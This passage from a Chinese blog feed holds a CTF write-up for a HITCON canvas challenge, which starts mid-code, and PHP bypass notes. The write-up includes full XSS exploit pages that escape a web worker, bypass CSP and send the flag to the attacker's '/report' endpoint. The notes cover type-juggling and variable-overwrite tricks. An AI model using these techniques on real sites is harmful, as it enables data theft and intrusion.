class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>`</span><br>&#125;)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-comment">// hardening</span><br><span class="hljs-title function_">hardening</span>()<br><br><span class="hljs-comment">// fps controlling solution based on https://stackoverflow.com/questions/19764018/controlling-fps-with-requestanimationframe</span><br><span class="hljs-keyword">let</span> fps = <span class="hljs-number">60</span><br><span class="hljs-keyword">let</span> fpsInterval = <span class="hljs-number">1000</span> / fps<br><span class="hljs-keyword">let</span> then = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()<br><span class="hljs-keyword">let</span> frame = <span class="hljs-number">0</span><br><span class="hljs-keyword">let</span> stop = <span class="hljs-literal">false</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">if</span> (stop) <span class="hljs-keyword">return</span><br><span class="hljs-title function_">requestAnimationFrame</span>(render)<br><br><span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()<br><span class="hljs-keyword">const</span> elapsed = now - then<br><br><span class="hljs-keyword">if</span> (elapsed &gt; fpsInterval) &#123;<br>then = now - (elapsed % fpsInterval)<br><br>frame++<br><span class="hljs-keyword">const</span> success = <span class="hljs-title function_">callUserFn</span>(frame / fps)<br><span class="hljs-keyword">if</span> (!success) &#123;<br>stop = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-title function_">requestAnimationFrame</span>(render)<br><br><span class="hljs-comment">// initial render</span><br><span class="hljs-title function_">callUserFn</span>(<span class="hljs-number">0</span>)<br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>worker.js用<code>escapeHTML()</code>转义了特殊字符，<code>hardening()</code>使某些对象和原型不可变，并阻止构造函数属性的修改来增强 JavaScript 环境的安全性和完整性，限制对某些属性的访。在尝试访问或修改 constructor 属性时会抛出错误，对于每个构造函数，它都会冻结构造函数本身和其原型使其不可变，防止对其属性的进一步修改或添加新属性。<br>剩下就是渲染了</p><h4 id="再看看localStorage"><a href="#再看看localStorage" class="headerlink" title="再看看localStorage"></a>再看看localStorage</h4><p>是一个在浏览器中存储数据的 Web API，它提供了一个简单的键值对存储系统，用于将数据存储在客户端的浏览器中。这意味着您可以在浏览器中存储持久性数据，以便在用户会话之间保留状态或保存用户首选项等信息。<br><code>localStorage.savedCode</code>可能是用来存储用户在网页或应用程序中输入或编辑的代码或其他文本数据的属性<br>这里保存了代码</p><h4 id="最后看看bot"><a href="#最后看看bot" class="headerlink" title="最后看看bot"></a>最后看看bot</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">..</span>.<br>const FLAG = process.env.FLAG || <span class="hljs-string">&#x27;test&#123;flag&#125;&#x27;</span><br>const CODE = `<span class="hljs-attribute">f</span>=<span class="hljs-variable">$&#123;JSON.stringify(FLAG)&#125;</span>;l=f.length<br>c.<span class="hljs-attribute">width</span>=1920<br>x.<span class="hljs-attribute">font</span>=<span class="hljs-string">&quot;200px Arial&quot;</span><br><span class="hljs-keyword">for</span>(<span class="hljs-attribute">i</span>=0;i&lt;l;i++)&#123;x.<span class="hljs-attribute">fillStyle</span>=R(128+S(T(t)-i)*70,128+C(T(t)+i)*70,128+S(T(t)-l-i)*70,1.0);x.fillText(f[i],300+i<span class="hljs-number">*60</span>+C(T((t-i/l)/1.8)-i)<span class="hljs-number">*400</span>,540+S(T((t-i/l)/1.5)-i)<span class="hljs-number">*800</span>)&#125;`<br><span class="hljs-built_in">..</span>.<br></code></pre></td></tr></table></figure><p>由main.js可知flag在<code>localStorage.savedCode</code></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">...<br><span class="hljs-keyword">const</span> page1 = <span class="hljs-keyword">await</span> context.newPage()<br><span class="hljs-keyword">await</span> page1.<span class="hljs-keyword">goto</span>(SITE + <span class="hljs-string">&#x27;/?code=&#x27;</span> + encodeURIComponent(CODE))<br><span class="hljs-keyword">await</span> sleep(<span class="hljs-number">1000</span>)<br><span class="hljs-keyword">await</span> page1.close()<br>...<br></code></pre></td></tr></table></figure><p>执行新代码会重写，但由mian.js，flag在fallback里，最后可通过<code>eval(&quot;fallback&quot;)</code>执行</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>全局变量-&gt;-&gt;CSP绕过</p><h4 id="获得全局变量"><a href="#获得全局变量" class="headerlink" title="获得全局变量"></a>获得全局变量</h4><p>1.<br>使用<code>this</code>：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">(<span class="hljs-keyword">function</span><span class="hljs-params">()</span>&#123; <span class="hljs-keyword">throw</span> &#123; message: <span class="hljs-keyword">this</span> &#125; &#125;)()<br></code></pre></td></tr></table></figure><p>2.<br>滥用V8 Stack Trace API:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-literal">null</span>.<span class="hljs-title function_">f</span>()<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br><span class="hljs-title class_">TypeError</span> = e.<span class="hljs-property">constructor</span><br>&#125;<br><span class="hljs-title class_">Error</span> = <span class="hljs-title class_">TypeError</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">constructor</span><br><span class="hljs-title class_">Error</span>.<span class="hljs-property">prepareStackTrace</span> = <span class="hljs-function">(<span class="hljs-params">err, structuredStackTrace</span>) =&gt;</span> structuredStackTrace<br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-literal">null</span>.<span class="hljs-title function_">f</span>()<br>&#125; <span class="hljs-keyword">catch</span>(e) &#123;<br><span class="hljs-keyword">const</span> g = e.<span class="hljs-property">stack</span>[<span class="hljs-number">2</span>].<span class="hljs-title function_">getFunction</span>().<span class="hljs-property">arguments</span>[<span class="hljs-number">0</span>].<span class="hljs-property">target</span><br><span class="hljs-keyword">if</span> (g) &#123; <span class="hljs-keyword">throw</span> &#123; <span class="hljs-attr">message</span>: g &#125; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上两种方法都可以获得worker的全局变量<code>[object DedicatedWorkerGlobalScope]</code></p><h4 id="worker逃逸（？"><a href="#worker逃逸（？" class="headerlink" title="worker逃逸（？"></a>worker逃逸（？</h4><p>以此获得访问<code>lacalStorage</code>的方法<br>可以用<code>URL.createObjectURL</code>创建一个URL对象，这个对象与main同源</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">(<span class="hljs-keyword">function</span><span class="hljs-literal">()</span>&#123;<br>const u = this.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>create<span class="hljs-constructor">ObjectURL(<span class="hljs-params">new</span> <span class="hljs-params">this</span>.Blob([&#x27;&lt;<span class="hljs-params">h1</span>&gt;<span class="hljs-params">peko</span>&lt;<span class="hljs-operator">/</span><span class="hljs-params">h1</span>&gt;&#x27;], &#123; <span class="hljs-params">type</span>: &#x27;<span class="hljs-params">text</span><span class="hljs-operator">/</span><span class="hljs-params">html</span>&#x27; &#125;)</span>)<br>throw &#123; message: u &#125;<br>&#125;)<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><p>以上代码可以创建一个类似<code>blob:https://chal-canvas.chal.hitconctf.com/17a33cd9-ca3d-40a5-9944-4a18119aa576</code>的URL<br>但<code>blob</code>被视为本地资源，泄露url给服务器重定向，也不能<code>Location</code>，会导致<code>ERR_UNSAFE_REDIRECT</code>，使用Javascript会显示无法加载本地资源<br>选择使用<code>&lt;meta&gt;</code>重定向<code>blob</code>的url，这是同源的，可以用</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">(<span class="hljs-keyword">function</span><span class="hljs-literal">()</span>&#123;<br>const u = this.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>create<span class="hljs-constructor">ObjectURL(<span class="hljs-params">new</span> <span class="hljs-params">this</span>.Blob([&#x27;&lt;<span class="hljs-params">h1</span>&gt;<span class="hljs-params">peko</span>&lt;<span class="hljs-operator">/</span><span class="hljs-params">h1</span>&gt;&#x27;], &#123; <span class="hljs-params">type</span>: &#x27;<span class="hljs-params">text</span><span class="hljs-operator">/</span><span class="hljs-params">html</span>&#x27; &#125;)</span>)<br>this.post<span class="hljs-constructor">Message(&#123; <span class="hljs-params">type</span>: &#x27;<span class="hljs-params">error</span>&#x27;, <span class="hljs-params">content</span>: &#x27;<span class="hljs-params">hello</span>&#x27; + &#x27;&lt;<span class="hljs-params">meta</span> <span class="hljs-params">http</span>-<span class="hljs-params">equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-params">content</span>=<span class="hljs-string">&quot;0; url=&#x27; + u + &#x27;&quot;</span>&gt;&#x27; &#125;)</span><br>&#125;)<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h4><p>CSP：<code>default-src &#39;self&#39; &#39;unsafe-eval&#39;</code><br>选择利用worker.js<br>由于 worker 全局项和 window 全局项之间的相似性，worker.js 实际上在被包含在 window 上下文中时工作得很好，只需要从另一个窗口<code>postMessage</code>，然后再次绕过防护获得 XSS。</p><h3 id="大佬的exp"><a href="#大佬的exp" class="headerlink" title="大佬的exp"></a>大佬的exp</h3><p>1.</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">&lt;iframe id=<span class="hljs-string">&quot;orig&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe id=<span class="hljs-string">&quot;f&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;script&gt;<br>const sleep = ms =&gt; <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(resolve =&gt; <span class="hljs-built_in">setTimeout</span>(resolve, ms))<br>;(<span class="hljs-keyword">async</span> () =&gt; &#123;<br>const base = `<span class="language-javascript">$&#123;location.<span class="hljs-property">protocol</span>&#125;<span class="hljs-comment">//$&#123;location.host&#125;</span></span>`<br>const target = <span class="hljs-keyword">new</span> URLSearchParams(location.search).get(<span class="hljs-string">&#x27;target&#x27;</span>) ?? <span class="hljs-string">&#x27;http://localhost:8763&#x27;</span><br>orig.src = target<br><span class="hljs-keyword">await</span> sleep(<span class="hljs-number">500</span>)<br>f.src =<br>target +<br><span class="hljs-string">&#x27;/?code=&#x27;</span> +<br><span class="hljs-built_in">encodeURIComponent</span>(`<span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript"><span class="hljs-literal">null</span>.<span class="hljs-title function_">f</span>()</span><br><span class="language-javascript">&#125; <span class="hljs-keyword">catch</span> (e) &#123;</span><br><span class="language-javascript"><span class="hljs-title class_">TypeError</span> = e.<span class="hljs-property">constructor</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title class_">Error</span> = <span class="hljs-title class_">TypeError</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">constructor</span></span><br><span class="language-javascript"><span class="hljs-title class_">Error</span>.<span class="hljs-property">prepareStackTrace</span> = <span class="hljs-function">(<span class="hljs-params">err, structuredStackTrace</span>) =&gt;</span> structuredStackTrace</span><br><span class="language-javascript"><span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript"><span class="hljs-literal">null</span>.<span class="hljs-title function_">f</span>()</span><br><span class="language-javascript">&#125;<span class="hljs-keyword">catch</span>(e)&#123;</span><br><span class="language-javascript">g=e.<span class="hljs-property">stack</span>[<span class="hljs-number">2</span>]?.<span class="hljs-title function_">getFunction</span>().<span class="hljs-property">arguments</span>[<span class="hljs-number">0</span>].<span class="hljs-property">target</span></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">new</span> g.<span class="hljs-title class_">Blob</span>([<span class="hljs-string">&#x27;&lt;h1&gt;peko&lt;/h1&gt;&lt;script src=&quot;$&#123;target&#125;/worker.js&quot;&gt;&lt;\/script&gt;&#x27;</span>], &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;text/html&#x27;</span>&#125;)</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> url = g.<span class="hljs-property">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob)</span><br><span class="language-javascript">g.<span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">&#x27;hello&#x27;</span> + <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&#x27;</span>+url+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span> &#125;)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span>`)<br><span class="hljs-keyword">await</span> sleep(<span class="hljs-number">2000</span>)<br>console.log(<span class="hljs-string">&#x27;posting&#x27;</span>)<br>const canvas = document.createElement(<span class="hljs-string">&#x27;canvas&#x27;</span>).transferControlToOffscreen()<br>f.contentWindow.postMessage(<br>&#123;<br>type: <span class="hljs-string">&#x27;init&#x27;</span>,<br>code: `<span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript"><span class="hljs-literal">null</span>.<span class="hljs-title function_">f</span>()</span><br><span class="language-javascript">&#125; <span class="hljs-keyword">catch</span> (e) &#123;</span><br><span class="language-javascript"><span class="hljs-title class_">TypeError</span> = e.<span class="hljs-property">constructor</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title class_">Error</span> = <span class="hljs-title class_">TypeError</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">constructor</span></span><br><span class="language-javascript"><span class="hljs-title class_">Error</span>.<span class="hljs-property">prepareStackTrace</span> = <span class="hljs-function">(<span class="hljs-params">err, structuredStackTrace</span>) =&gt;</span> structuredStackTrace</span><br><span class="language-javascript"><span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript"><span class="hljs-literal">null</span>.<span class="hljs-title function_">f</span>()</span><br><span class="language-javascript">&#125;<span class="hljs-keyword">catch</span>(e)&#123;</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> g = e.<span class="hljs-property">stack</span>[<span class="hljs-number">2</span>].<span class="hljs-title function_">getFunction</span>().<span class="hljs-property">arguments</span>[<span class="hljs-number">0</span>].<span class="hljs-property">target</span></span><br><span class="language-javascript">g.<span class="hljs-property">location</span> = $&#123;<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(base)&#125; + <span class="hljs-string">&#x27;/report?result=&#x27;</span> + g.<span class="hljs-built_in">encodeURIComponent</span>(g.<span class="hljs-property">top</span>[<span class="hljs-number">0</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;fallback&#x27;</span>))</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span>`,<br>canvas<br>&#125;,<br><span class="hljs-string">&#x27;*&#x27;</span>,<br>[canvas]<br>)<br>&#125;)()<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>2.</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">&lt;iframe id=<span class="hljs-string">&quot;orig&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;iframe id=<span class="hljs-string">&quot;f&quot;</span>&gt;&lt;/iframe&gt;<br>&lt;script&gt;<br>const sleep = ms =&gt; <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(resolve =&gt; <span class="hljs-built_in">setTimeout</span>(resolve, ms))<br>;(<span class="hljs-keyword">async</span> () =&gt; &#123;<br>const base = `<span class="language-javascript">$&#123;location.<span class="hljs-property">protocol</span>&#125;<span class="hljs-comment">//$&#123;location.host&#125;</span></span>`<br>const target = <span class="hljs-keyword">new</span> URLSearchParams(location.search).get(<span class="hljs-string">&#x27;target&#x27;</span>) ?? <span class="hljs-string">&#x27;http://localhost:8763&#x27;</span><br>orig.src = target<br><span class="hljs-keyword">await</span> sleep(<span class="hljs-number">500</span>)<br>f.src =<br>target +<br><span class="hljs-string">&#x27;/?code=&#x27;</span> +<br><span class="hljs-built_in">encodeURIComponent</span>(`<span class="language-javascript"></span><br><span class="language-javascript">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-title function_">with</span>(<span class="hljs-params"><span class="hljs-variable language_">this</span></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([<span class="hljs-string">&#x27;&lt;h1&gt;peko&lt;/h1&gt;&lt;script src=&quot;$&#123;target&#125;/worker.js&quot;&gt;&lt;\/script&gt;&#x27;</span>], &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;text/html&#x27;</span>&#125;)</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> url = <span class="hljs-variable constant_">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob)</span><br><span class="language-javascript"><span class="hljs-title function_">postMessage</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">&#x27;hello&#x27;</span> + <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=&#x27;</span>+url+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span> &#125;)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;)()</span><br><span class="language-javascript"></span>`)<br><span class="hljs-keyword">await</span> sleep(<span class="hljs-number">2000</span>)<br>console.log(<span class="hljs-string">&#x27;posting&#x27;</span>)<br>const canvas = document.createElement(<span class="hljs-string">&#x27;canvas&#x27;</span>).transferControlToOffscreen()<br>f.contentWindow.postMessage(<br>&#123;<br>type: <span class="hljs-string">&#x27;init&#x27;</span>,<br>code: `<span class="language-javascript"></span><br><span class="language-javascript">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-title function_">with</span>(<span class="hljs-params"><span class="hljs-variable language_">this</span></span>) &#123;</span><br><span class="language-javascript">location = $&#123;<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(base)&#125; + <span class="hljs-string">&#x27;/report?result=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(top[<span class="hljs-number">0</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;fallback&#x27;</span>))</span><br><span class="language-javascript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;stop&quot;</span>)</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;)()</span><br><span class="language-javascript"></span>`,<br>canvas<br>&#125;,<br><span class="hljs-string">&#x27;*&#x27;</span>,<br>[canvas]<br>)<br>&#125;)()<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/08/12：php的一些记录</title>
    <link href="/2023/09/22/somephp/"/>
    <url>/2023/09/22/somephp/</url>
    
    <content type="html"><![CDATA[<p>来源<br><a href="https://cloud.tencent.com/developer/article/1055505?from=15425">https://cloud.tencent.com/developer/article/1055505?from=15425</a><br><a href="https://cloud.tencent.com/developer/article/2127498">https://cloud.tencent.com/developer/article/2127498</a></p><h4 id="要求变量原值不同但md5或sha1相同的情况下"><a href="#要求变量原值不同但md5或sha1相同的情况下" class="headerlink" title="要求变量原值不同但md5或sha1相同的情况下"></a>要求变量原值不同但md5或sha1相同的情况下</h4><p><code>sha1()</code>和<code>md5()</code>都用于计算字符串的散列值，但是两者都无法处理数组，不会抛出异常而是直接返回NULL</p><h5 id="1-0e开头的全部相等（-判断）"><a href="#1-0e开头的全部相等（-判断）" class="headerlink" title="1.0e开头的全部相等（==判断）"></a>1.0e开头的全部相等（==判断）</h5><p>240610708 和 QNKCDZO md5值类型相似，但并不相同，在”==”相等操作符的运算下，结果返回了true。Md5和sha1一样</p><h5 id="2-利用数组绕过（-判断）"><a href="#2-利用数组绕过（-判断）" class="headerlink" title="2.利用数组绕过（===判断）"></a>2.利用数组绕过（===判断）</h5><p>Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断</p><h4 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp()函数"></a>strcmp()函数</h4><p>当输入的两个值为不是字符串时就会产生不预期的返回值，比如数组（php版本5.3.3至5.5中，不包含5.5）<br><code>ereg()</code>和<code>strpos</code>处理数组也会异常，返回NULL</p><h4 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h4><p>解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量<br>当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞</p><h4 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h4><p>用于获取变量的整数值<br>在转换时，函数会从字符串起始处进行转换直到遇到一个非数字的字符<br>即使出现无法转换的字符串也不会报错而是返回0</p><h4 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h4><p>用来判断一个值是否在某一个数组列表里面。其缺陷在于存在自动类型转换，当输入数字1后再紧跟其他字符串能够Bypass检测数组的功能</p><h4 id="json-decode-函数"><a href="#json-decode-函数" class="headerlink" title="json_decode()函数"></a>json_decode()函数</h4><p>用于对json格式数据进行json解码操作，对于一个json类型的字符串，会解密成一个数组，其存在一个<code>0==&quot;efeaf&quot;</code>的Bypass</p><h4 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match()函数"></a>preg_match()函数</h4><p>执行一个正则表达式匹配<br><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</code><br>1.<code>$pattern</code>：要搜索的模式，字符串形式<br>2.<code>$subject</code>：要搜索检测的目标字符串<br>3.<code>matches</code>：如果提供了参数<code>matches</code>，它将被填充为搜索结果<code>matches[0]</code>将包含完整模式匹配到的文本<br>4.<code>$flags</code>：可设置标记值<br>5.<code>$offset</code>：可选参数<code>offset</code>用于指定从目标字符串的某个未知开始搜索(单位是字节)<br><code>/i</code>修饰符，大小写不敏感<br><code>/m</code>修饰符，多行匹配，当出现换行符<code>%0a</code>的时候，会被当做两行处理，此时只可以匹配第1行，后面的行就会被忽略</p><h4 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h4><p>执行一个正则表达式的搜索和替换<br><code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code><br>1.<code>$pattern</code>：要搜索的模式，可以是字符串或一个字符串数组<br>2.<code>$replacement</code>：用于替换的字符串或字符串数组<br>3.<code>$subject</code>：要搜索替换的目标字符串或字符串数组<br>4.<code>$limit</code>：可选，对于每个模式用于每个 subject 字符串的最大可替换次数。默认是-1（无限制）<br>5.<code>$count</code>：可选，为替换执行的次数<br><code>/e</code>修饰符<br>使preg_replace()将replacement参数当作 PHP 代码</p><h4 id="register-globals全局变量覆盖"><a href="#register-globals全局变量覆盖" class="headerlink" title="register_globals全局变量覆盖"></a>register_globals全局变量覆盖</h4><p>php.ini中有一项为register_globals，即注册全局变量<br>register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用<br>register_globals=Off时，我们需要到特定的数组里去得到它<br>（PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除）<br>当register_globals=On，变量未被初始化且能够用户所控制时，就会存在变量覆盖漏洞</p><h4 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h4><p>从数组中将变量导入到当前的符号表<br>使用数组键名作为变量名，使用数组键值作为变量值<br>针对数组中的每个元素，将在当前符号表中创建对应的一个变量<br><code>int extract ( array $var_array [, int $extract_type [, string $prefix ]] )</code><br>第二个参数指定函数将变量导入符号表时的行为:<br>1.当值为EXTR_OVERWRITE时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量<br>2.值为EXTR_SKIP则表示跳过不覆盖<br>3.若第二个参数未指定，则在默认情况下使用EXTR_OVERWRITE<br>当extract()函数从用户可以控制的数组中导出变量且第二个参数未设置或设置为EXTR_OVERWRITE时，就存在变量覆盖漏洞</p><h4 id="import-request-variables-变量覆盖"><a href="#import-request-variables-变量覆盖" class="headerlink" title="import_request_variables()变量覆盖"></a>import_request_variables()变量覆盖</h4><p>将GET、POST、Cookies中的变量导入到全局(4.1.0 &lt;= PHP &lt; 5.4.0)<br><code>bool import_request_variables (string $types [, string $prefix])</code><br>1.<code>$type</code>代表要注册的变量，G代表GET，P代表POST，C代表COOKIE<br>2.第二个参数为要注册变量的前缀</p><h4 id="导致的变量覆盖"><a href="#导致的变量覆盖" class="headerlink" title="$$导致的变量覆盖"></a>$$导致的变量覆盖</h4><p>1.<code>\$var</code>是一个正常变量，名称为：var，存储任何值，如：string，integer，float等<br>2.<code>\var</code>是一个引用变量，用于存储斜杠</p><h4 id="strstr-函数"><a href="#strstr-函数" class="headerlink" title="strstr()函数"></a>strstr()函数</h4><p>大小写敏感</p><h4 id="mt-rand-函数"><a href="#mt-rand-函数" class="headerlink" title="mt_rand()函数"></a>mt_rand()函数</h4><p>随机数生成工具<br>问题在于每个php cgi进程期间，只有第一次调用mt_rand()会自动播种，接下来都会根据这个第一次播种的种子来生成随机数<br>所以可以通过逆向得到随机种子，然后获取后面其他随机数，如路径之类的信息就有了<br>使用php_mt_seed工具</p><h4 id="当有两个is-numeric判断并用and连接时，and后面的is-numeric可以绕过"><a href="#当有两个is-numeric判断并用and连接时，and后面的is-numeric可以绕过" class="headerlink" title="当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过"></a>当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span 